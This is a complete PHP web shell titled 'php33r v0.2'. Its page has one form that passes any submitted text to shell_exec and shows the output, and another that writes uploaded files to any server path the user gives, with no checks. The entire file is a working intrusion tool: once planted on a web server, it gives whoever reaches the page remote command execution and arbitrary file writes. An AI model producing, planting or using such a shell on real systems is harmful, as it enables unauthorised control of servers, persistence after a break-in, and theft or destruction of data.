<body style="background-color:#424242;">
<font style="float:right;" color="#F2F2F2"><b>php33r v0.2</b> - b33f</font><br /><br />

<fieldset style="border:2px solid #ffffff;opacity:0.5;border-radius:5px;background:#FE2E2E;">
<form style="float:left;color:#ffffff;" action="" method="post">
<b>Command Execution:</b><br />
<input type= "text" name="command" />
<input type="submit" value="Go!"/>
</form>

<form style="float:right;color:#ffffff;" action="" method="POST" enctype="multipart/form-data">
<b>Full Remote Path:</b><br />
<input type="text" name="upload" /> (eg: /tmp/, C:\Users\b33f\Desktop\)<br /><br />
<b>File Upload:</b><br />
<input type="submit" value="Upload!"/>
<input type="file" name="file" />
</form></fieldset>

<?php 
   if(isset($_FILES['file'])){
      $errors= array();
      $file_name = $_FILES['file']['name'];
      $file_size =$_FILES['file']['size'];
      $file_tmp =$_FILES['file']['tmp_name'];
      $file_type=$_FILES['file']['type'];   
      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
               
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,$_POST['upload'].$file_name);
         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
         echo 'Stored in: ' . $_POST['upload'];
         echo '</span></pre>';
      }else{
         print_r($errors);
      }
   }
   function exec_cmd(){
      if (isset($_POST['command'])){
         $exc = $_POST['command']; echo shell_exec($exc);
      }
   }
   echo '<pre><span style="font-size:11px;color:#F2F2F2;">';
   exec_cmd();
   echo '</span></pre>';
?>

